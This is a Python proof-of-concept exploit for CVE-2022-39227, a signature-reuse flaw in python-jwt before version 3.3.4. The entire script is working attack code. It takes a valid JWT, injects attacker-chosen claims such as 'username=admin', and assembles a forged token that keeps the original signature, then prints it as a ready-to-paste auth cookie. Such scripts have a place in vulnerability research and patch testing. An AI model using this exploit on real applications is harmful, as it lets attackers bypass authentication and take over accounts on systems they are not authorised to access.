#!/usr/bin/env python3
# Proof of concept for the CVE-2022-39227. According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with moified claims. 
# 
# Application: python-jwt
# Infected version: < 3.3.4
# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227
#
# Dependencies: jwcrypto, json, argparse
# Author: user0x1337
# Github: https://github.com/user0x1337
#
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse

parser = argparse.ArgumentParser(prog='CVE-2022-39227-PoC', description='Proof of Concept for the JWT verification bug in python-jwt version < 3.3.4')
parser.add_argument('-j', '--jwt_token', required=True, dest='token', help='Original and valid JWT Token returned by the application')
parser.add_argument('-i', '--injected_claim', required=True, dest='claim', help='Inject claim using the form "key=value", e.g. "username=admin". Use "," for more claims (e.g. username=admin,id=3)')
args = parser.parse_args()

# Split JWT in its ingredients
[header, payload, signature] = args.token.split(".")
print(f"[+] Retrieved base64 encoded payload: {payload}")

# Payload is relevant
parsed_payload = loads(base64url_decode(payload))
print(f"[+] Decoded payload: {parsed_payload}")

# Processing of the user input and inject new claims
try:
    claims = args.claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

# merging. Generate a new payload
print(f'[+] Inject new "fake" payload: {parsed_payload}')
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
print(f'[+] Fake payload encoded: {fake_payload}\n')

# Create a new JWT Web Token
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] New token:\n {new_payload}\n')
print(f'Example (HTTP-Cookie):\n------------------------------\nauth={new_payload}')
 

